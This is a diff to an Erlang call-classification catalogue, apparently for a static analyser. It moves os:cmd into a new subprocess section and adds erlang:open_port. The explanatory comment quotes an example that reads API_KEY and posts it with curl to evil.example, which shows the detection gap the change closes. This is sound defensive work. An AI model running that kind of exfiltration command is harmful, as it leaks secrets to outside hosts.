@@ -145,9 +145,55 @@ process_send:
   - module: global
     functions: [send, register_name, re_register_name, unregister_name, whereis_name]
 
+# ---------------------------------------------------------------------------
+# Subprocess — the BEAM's process-launch surface (WI-jupaf).
+#
+# This section did not exist. erlang.yaml was the only one of the fourteen
+# shipped catalogues with no `subprocess:` key at all, so Erlang's entire
+# process-launch surface was unrepresented — and `os:cmd`, the shell-out
+# itself, was filed under env_read + env_write beside getenv/putenv.
+#
+# THAT IS A FALSE CONFIRM, NOT A RECALL MISS, and it was measured on the
+# shipped CLI: a module whose whole body is
+#     Secret = os:getenv("API_KEY"),
+#     os:cmd("curl -d " ++ Secret ++ " https://evil.example/p")
+# answered `{boundary: subprocess, must_not_exist: true}` with **confirmed,
+# rc 0, "No subprocess chains found."** The call was never invisible — it was
+# CLASSIFIED, as env_read, and since INV-buzab a classified call is what
+# `examined` means, so the exfiltration counted as an examined negative for the
+# boundary that was actually true.
+#
+# Elixir inherits this file (child-over-parent, as scala does java), so an
+# Elixir program calling the idiomatic-interop `:os.cmd/1` was in the same
+# state; the fix lands once here rather than being repeated in elixir.yaml,
+# and a parity test asserts the inherited answer.
+subprocess:
+  - module: os
+    functions: [cmd]
+    notes: >-
+      os:cmd/1 runs a command through the OS shell and returns its output.
+      Opaque by the ADR-0016 rule that a launch's own I/O is not in the edge
+      set: what `curl` does is invisible here, which is why the boundary must
+      be `subprocess` (INV-gahuz's opacity gate keys on it) rather than a
+      data-I/O category that would assert something specific and wrong.
+  - module: erlang
+    functions: [open_port]
+    notes: >-
+      erlang:open_port/2 is the primitive os:cmd/1 is implemented on top of,
+      and it was catalogued NOWHERE — producing no chain of any kind. Its
+      `{spawn, Command}` and `{spawn_executable, Path}` forms launch an
+      external program.
+
 env_read:
   - module: os
-    functions: [getenv, type, version, system_time, perf_counter, cmd]
+    functions: [getenv, type, version, system_time, perf_counter]
+    notes: >-
+      WI-jupaf: `cmd` was REMOVED from this list. os:cmd/1 is the BEAM
+      shell-out, not an environment read — it was swept in with the rest of the
+      os module and now lives under `subprocess:` below. It is removed rather
+      than ALSO declared there, because a multi-boundary primitive is resolved
+      by YAML row order (INV-zumin), which would make the correct declaration
+      live or inert depending on where it was pasted.
   - module: application
     functions: [get_env, get_all_env, get_key, get_all_key, get_application, loaded_applications, which_applications, info]
   - module: init
@@ -155,7 +201,8 @@ env_read:
 
 env_write:
   - module: os
-    functions: [putenv, unsetenv, cmd]
+    functions: [putenv, unsetenv]
+    notes: "WI-jupaf: `cmd` removed here too — see the env_read note above."
   - module: application
     functions: [set_env, unset_env, load, start, stop, ensure_started, ensure_all_started]
 
